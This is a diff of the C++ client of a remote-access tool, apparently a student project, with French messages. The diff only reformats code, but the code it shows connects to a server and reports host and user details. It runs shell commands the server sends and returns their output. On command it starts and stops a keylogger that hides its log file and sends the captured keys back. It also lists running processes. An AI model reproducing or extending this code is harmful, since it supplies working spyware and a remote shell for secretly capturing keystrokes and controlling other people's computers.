@@ -11,14 +11,13 @@
 #include "../utils/SystemInfo/TaskList.hpp"
 #include "../utils/CommandSystem/BashExec.hpp"
 
-
 /**
  * @brief Constructs the ClientApp object and initializes the running flag.
  */
 ClientApp::ClientApp()
     : running(true)
-{}
-
+{
+}
 
 /**
  * @brief Destructor for ClientApp. Stops threads and closes the socket.
@@ -33,7 +32,6 @@ ClientApp::~ClientApp()
     if (socket)
         socket->closeSocket();
 }
-
 
 /**
  * @brief Main entry point for the client application. Initializes, connects, and enters the main loop.
@@ -72,7 +70,6 @@ void ClientApp::setupConsole()
     // SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 
-
 /**
  * @brief Loads environment variables and connects the socket to the server.
  */
@@ -84,7 +81,6 @@ void ClientApp::loadAndConnectEnv()
     socket->connectSocket(ip, port);
     std::cout << "Connecté au serveur " << ip << ":" << port << std::endl;
 }
-
 
 /**
  * @brief Sends system information to the server after printing it locally.
@@ -101,19 +97,17 @@ void ClientApp::sendSystemInfo()
     std::cout << "Informations système envoyées au serveur.\n";
 }
 
-
 /**
  * @brief Prints system information to the console.
  * @param sysInfo Map containing system information fields and values.
  */
-void ClientApp::printSystemInfo(const std::map<std::string, std::string>& sysInfo)
+void ClientApp::printSystemInfo(const std::map<std::string, std::string> &sysInfo)
 {
     std::cout << "Informations système:" << std::endl;
     std::cout << "- Nom d'hôte: " << sysInfo.at("hostname") << std::endl;
     std::cout << "- Utilisateur: " << sysInfo.at("username") << std::endl;
     std::cout << "- Système: " << sysInfo.at("operating_system") << std::endl;
 }
-
 
 /**
  * @brief Lists running processes using ProcessLister (result unused).
@@ -124,7 +118,6 @@ void ClientApp::listProcesses()
     std::vector<std::string> exeList = processLister.getExeList();
 }
 
-
 /**
  * @brief Launches the server request handler thread.
  */
@@ -134,7 +127,6 @@ void ClientApp::launchServerThread()
 }
 
 // --------------------------------------------
-
 
 /**
  * @brief Handles incoming server requests in a loop until stopped.
@@ -157,12 +149,11 @@ void ClientApp::serverRequestHandler()
     }
 }
 
-
 /**
  * @brief Dispatches the received packet to the appropriate handler based on its type.
  * @param packet The received LPTF_Packet from the server.
  */
-void ClientApp::handlePacket(const LPTF_Packet& packet)
+void ClientApp::handlePacket(const LPTF_Packet &packet)
 {
     switch (packet.getType())
     {
@@ -189,12 +180,11 @@ void ClientApp::handlePacket(const LPTF_Packet& packet)
     }
 }
 
-
 /**
  * @brief Handles exceptions thrown during server communication.
  * @param e The exception caught.
  */
-void ClientApp::handleServerException(const std::exception& e)
+void ClientApp::handleServerException(const std::exception &e)
 {
     if (running)
     {
@@ -205,12 +195,11 @@ void ClientApp::handleServerException(const std::exception& e)
 
 // --------------- Individual packet handlers ---------------
 
-
 /**
  * @brief Handles a GET_INFO packet by sending system info back to the server.
  * @param packet The received GET_INFO packet (unused).
  */
-void ClientApp::handleGetInfoPacket(const LPTF_Packet&)
+void ClientApp::handleGetInfoPacket(const LPTF_Packet &)
 {
     std::cout << "\n[CLIENT DEBUG] Received GET_INFO packet from server.\n";
     auto sysInfo = SystemInfo::getSystemInfo();
@@ -224,12 +213,11 @@ void ClientApp::handleGetInfoPacket(const LPTF_Packet&)
     std::cout << "[CLIENT DEBUG] RESPONSE packet sent.\n";
 }
 
-
 /**
  * @brief Handles a KEYLOG packet by starting or stopping the keylogger.
  * @param packet The received KEYLOG packet.
  */
-void ClientApp::handleKeylogPacket(const LPTF_Packet& packet)
+void ClientApp::handleKeylogPacket(const LPTF_Packet &packet)
 {
     std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
     if (cmd == "start")
@@ -238,12 +226,11 @@ void ClientApp::handleKeylogPacket(const LPTF_Packet& packet)
         stopKeylogger(packet);
 }
 
-
 /**
  * @brief Handles an EXEC_COMMAND packet by executing the command and saving output to file.
  * @param packet The received EXEC_COMMAND packet.
  */
-void ClientApp::handleExecCommandPacket(const LPTF_Packet& packet)
+void ClientApp::handleExecCommandPacket(const LPTF_Packet &packet)
 {
     std::cout << "[CLIENT DEBUG] Received EXEC_COMMAND packet from server.\n";
     std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
@@ -264,11 +251,14 @@ void ClientApp::handleExecCommandPacket(const LPTF_Packet& packet)
     // Read the output file
     std::ifstream in("exec_output.txt", std::ios::binary);
     std::string output;
-    if (in) {
+    if (in)
+    {
         output.assign((std::istreambuf_iterator<char>(in)),
                       std::istreambuf_iterator<char>());
         in.close();
-    } else {
+    }
+    else
+    {
         output = "Impossible de lire exec_output.txt";
     }
 
@@ -280,12 +270,11 @@ void ClientApp::handleExecCommandPacket(const LPTF_Packet& packet)
     std::cout << "[CLIENT DEBUG] RESPONSE (exec output) packet sent.\n";
 }
 
-
 /**
  * @brief Handles a PROCESS_LIST packet by sending the process list to the server.
  * @param packet The received PROCESS_LIST packet.
  */
-void ClientApp::handleProcessListPacket(const LPTF_Packet& packet)
+void ClientApp::handleProcessListPacket(const LPTF_Packet &packet)
 {
     bool namesOnly = (packet.getFlags() & 1) != 0;
     std::string resp = getProcessListString(namesOnly);
@@ -294,7 +283,6 @@ void ClientApp::handleProcessListPacket(const LPTF_Packet& packet)
                       packet.getPacketId(), packet.getSessionId(), payload);
     socket->sendBinary(reply.serialize());
 }
-
 
 /**
  * @brief Gets a string listing all running processes.
@@ -311,9 +299,11 @@ std::string ClientApp::getProcessListString(bool namesOnly)
         for (size_t i = 0; i < count; ++i)
         {
             DWORD pid = pids[i];
-            if (pid == 0) continue;
+            if (pid == 0)
+                continue;
             HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-            if (!hProc) continue;
+            if (!hProc)
+                continue;
             CHAR nameBuf[MAX_PATH] = {0};
             HMODULE hMod;
             DWORD cbMod;
@@ -341,7 +331,8 @@ void ClientApp::startKeylogger()
         KeyLogger::hideFile("key_file.txt");
         if (keylogThread.joinable())
             keylogThread.join();
-        keylogThread = std::thread([this]() { keyLogger->start(); });
+        keylogThread = std::thread([this]()
+                                   { keyLogger->start(); });
         // Thread will be joined in destructor or when stopping keylogger
     }
 }
@@ -350,7 +341,7 @@ void ClientApp::startKeylogger()
  * @brief Stops the keylogger and sends the logged data back to the server.
  * @param packet The received KEYLOG packet containing the request to stop logging.
  */
-void ClientApp::stopKeylogger(const LPTF_Packet& packet)
+void ClientApp::stopKeylogger(const LPTF_Packet &packet)
 {
     if (keyLogger)
     {
